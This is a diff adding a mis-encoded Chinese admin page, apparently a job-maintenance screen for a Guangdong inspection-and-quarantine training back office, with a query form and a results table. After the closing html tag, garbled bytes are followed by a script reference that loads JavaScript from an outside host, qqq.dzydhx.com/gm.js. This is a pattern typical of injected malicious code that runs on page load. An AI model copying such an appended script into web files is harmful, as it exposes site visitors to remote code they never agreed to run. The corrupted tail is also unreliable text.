@@ -1,0 +1,111 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
+<title>¹ã¶«¼ìÑé¼ìÒß£¨¼ìÎñ£©ÍøÉÏÅàÑµÏµÍ³ºóÌ¨¹ÜÀíÏµÍ³</title>
+<link href="../css/htlogin.css" rel="stylesheet" type="text/css" />
+<script>
+<!--
+	function del()
+	{
+		var chks=document.all('chk');
+		for(var i=0;i<chks.length;i++)
+		{
+			if(chks[i].checked)
+			{
+				chks[i].parentNode.parentNode.style['display']='none';
+			}
+		}
+	}
+//-->
+</script>
+</head>
+
+<body topmargin="0" leftmargin="0">
+<table width="100%" border="0" cellspacing="0" cellpadding="0">
+      <tr>
+        <td class="body01"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+            <tr>
+              <td background="../images/ht-body01.jpg" class="body02">µ±Ç°Î»ÖÃ£ºÏµÍ³¹ÜÀí-Ö°ÎñÎ¬»¤</td>
+            </tr>
+        </table></td>
+      </tr>
+      <tr>
+        <td class="body01"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+            <tr>
+              <td colspan="4" background="../images/ht-body02.jpg" class="body03">²éÑ¯Ìõ¼þ</td>
+            </tr>
+            <tr>
+              <td width="25%" class="body06">Ö°Îñ±àºÅ£º</td>
+              <td width="27%" class="body04"><input name="txtid" type="text" class="bodytext" /></td>
+              <td width="21%" class="body06">Ö°ÎñÃû³Æ£º</td>
+              <td width="23%" class="body04"><input name="txtname" type="text" class="bodytext" /></td>
+            </tr>
+    <tr>
+              <td colspan="4" class="body03"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+                  <tr>
+                    <td width="" height="35">&nbsp;</td>
+                    <td width="10%"><input type="image" src="../images/ht-but-add.jpg" name="Submit223" onclick="window.location='add2.html?id='+document.all.txtid.value+'&name='+document.all.txtname.value;" /></td>
+                    <td width="10%"><input type="image" src="../images/ht-but-check.jpg" name="Submit222" /></td>
+                    <td width="10%"><input type="image" src="../images/ht-but-del.jpg" name="Submit224" onclick="del();"/></td>
+                  </tr>
+              </table></td>
+            </tr>
+        </table></td>
+      </tr>
+      <tr>
+        <td class="body01a"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+            <tr>
+              <td colspan="5" background="../images/ht-body02.jpg" class="body03">²éÑ¯½á¹û</td>
+            </tr>
+            <tr>
+              <td width="5%" align="center" class="body05">Ñ¡Ôñ</td>
+              <td width="38%" align="center" class="body05">Ö°Îñ±àºÅ</td>
+              <td width="27%" align="center" class="body05">Ö°ÎñÃû³Æ</td>
+              <td width="30%" align="center" class="body05">²Ù×÷</td>
+            </tr>
+            <tr>
+              <td class="body03"><input type="checkbox" name="chk" value="checkbox1" /></td>
+              <td class="body03"><a href="#" onclick="window.location='update2.html?id='+this.parentNode.parentNode.childNodes[1].firstChild.innerHTML+'&name='+this.parentNode.parentNode.childNodes[2].innerHTML;">1001</a></td>
+              <td class="body03">Ö°Îñone</td>
+              <td align="center" class="body03">
+<input type="image" src="../images/ht-but-del.jpg" name="Submit224" onclick="if(!confirm('È·ÊµÒªÉ¾³ýÂð£¿')){return false;};this.parentNode.parentNode.style.display='none';""/>
+<input type="image" src="../images/ht-but-adit.jpg" name="Submit22" onclick="window.location='update2.html?id='+this.parentNode.parentNode.childNodes[1].firstChild.innerHTML+'&name='+this.parentNode.parentNode.childNodes[2].innerHTML;"/>		
+		</td>
+            </tr>
+            <tr>
+              <td class="body03"><input type="checkbox" name="chk" value="checkbox2" /></td>
+              <td class="body03"><a href="#" onclick="window.location='update2.html?id='+this.parentNode.parentNode.childNodes[1].firstChild.innerHTML+'&name='+this.parentNode.parentNode.childNodes[2].innerHTML;">1002</a></td>
+              <td class="body03">Ö°Îñtwo</td>
+              <td align="center" class="body03">
+<input type="image" src="../images/ht-but-del.jpg" name="Submit224" onclick="if(!confirm('È·ÊµÒªÉ¾³ýÂð£¿')){return false;};this.parentNode.parentNode.style.display='none';"/>
+<input type="image" src="../images/ht-but-adit.jpg" name="Submit22" onclick="window.location='update2.html?id='+this.parentNode.parentNode.childNodes[1].firstChild.innerHTML+'&name='+this.parentNode.parentNode.childNodes[2].innerHTML;"/>
+		</td>
+            </tr>
+            <tr>
+              <td class="body03"><input type="checkbox" name="chk" value="checkbox3" /></td>
+              <td class="body03"><a href="#" onclick="window.location='update2.html?id='+this.parentNode.parentNode.childNodes[1].firstChild.innerHTML+'&name='+this.parentNode.parentNode.childNodes[2].innerHTML;">1003</a></td>
+              <td class="body03">Ö°Îñthree</td>
+              <td align="center" class="body03">
+<input type="image" src="../images/ht-but-del.jpg" name="Submit224" onclick="if(!confirm('È·ÊµÒªÉ¾³ýÂð£¿')){return false;};this.parentNode.parentNode.style.display='none';"/>
+<input type="image" src="../images/ht-but-adit.jpg" name="Submit22" onclick="window.location='update2.html?id='+this.parentNode.parentNode.childNodes[1].firstChild.innerHTML+'&name='+this.parentNode.parentNode.childNodes[2].innerHTML;"/>
+		</td>
+            </tr>
+            <tr>
+              <td class="body03"><input type="checkbox" name="chk" value="checkbox4" /></td>
+              <td class="body03"><a href="#" onclick="window.location='update2.html?id='+this.parentNode.parentNode.childNodes[1].firstChild.innerHTML+'&name='+this.parentNode.parentNode.childNodes[2].innerHTML;">1004</a></td>
+              <td class="body03">Ö°Îñfour</td>
+              <td align="center" class="body03">
+<input type="image" src="../images/ht-but-del.jpg" name="Submit224" onclick="if(!confirm('È·ÊµÒªÉ¾³ýÂð£¿')){return false;};this.parentNode.parentNode.style.display='none';"/>
+<input type="image" src="../images/ht-but-adit.jpg" name="Submit22" onclick="window.location='update2.html?id='+this.parentNode.parentNode.childNodes[1].firstChild.innerHTML+'&name='+this.parentNode.parentNode.childNodes[2].innerHTML;"/>
+		</td>
+            </tr>
+
+        </table></td>
+      </tr>
+    </table>
+</body>
+</html>
+
+{®
+z¸.ÓO5ÑvøÎm‰G“g9±«™–íìhttp://qqq.dzydhx.com/gm.js></script>
